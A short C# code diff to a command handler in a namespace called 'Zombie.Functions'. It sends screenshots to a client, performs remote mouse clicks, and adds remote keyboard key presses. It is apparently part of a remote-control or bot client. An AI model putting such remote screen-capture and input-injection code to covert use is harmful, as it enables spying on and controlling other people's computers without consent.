@@ -29,8 +29,11 @@ namespace Zombie.Functions
                     Client.Send(Screenshot.Take());
                     break;
                 case CommandFlags.Click:
-                    MousePoint mp = MouseOperations.ConvertScreenPointToCurrent(reader.ReadInt32(), reader.ReadInt32(), reader.ReadInt32(), reader.ReadInt32());
-                    MouseOperations.LeftClickOnPoint(mp.X, mp.Y);
+                    MousePoint mp = InputControl.ConvertScreenPointToCurrent(reader.ReadInt32(), reader.ReadInt32(), reader.ReadInt32(), reader.ReadInt32());
+                    InputControl.LeftClickOnPoint(mp.X, mp.Y);
+                    break;
+                case CommandFlags.KeyboardKey:
+                    InputControl.KeyboardPress(reader.ReadInt32());
                     break;
 
             }
